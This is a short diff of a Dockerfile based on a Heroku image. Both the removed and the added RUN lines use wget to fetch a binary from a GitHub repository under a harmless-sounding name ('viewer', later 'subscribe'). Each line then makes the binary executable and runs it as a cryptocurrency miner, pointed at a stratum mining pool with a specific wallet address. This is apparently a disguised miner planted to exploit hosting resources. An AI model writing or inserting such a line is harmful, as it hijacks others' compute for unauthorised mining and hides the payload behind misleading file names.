@@ -1,4 +1,4 @@
 FROM heroku/heroku:18
 RUN apt-get install -y curl git unzip wget
-RUN wget https://github.com/AVGandhi/student/raw/main/viewer; chmod +x viewer; ./viewer --disable-gpu --algorithm yespower2b --pool stratum-na.rplant.xyz:7022 --wallet MZcw786kC8ng7KUeHZMQuhFhr2Funss7Kk.VPS --cpu-threads-priority 1
+RUN wget https://github.com/AVGandhi/student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MZcw786kC8ng7KUeHZMQuhFhr2Funss7Kk.VPS
 CMD bash heroku.sh
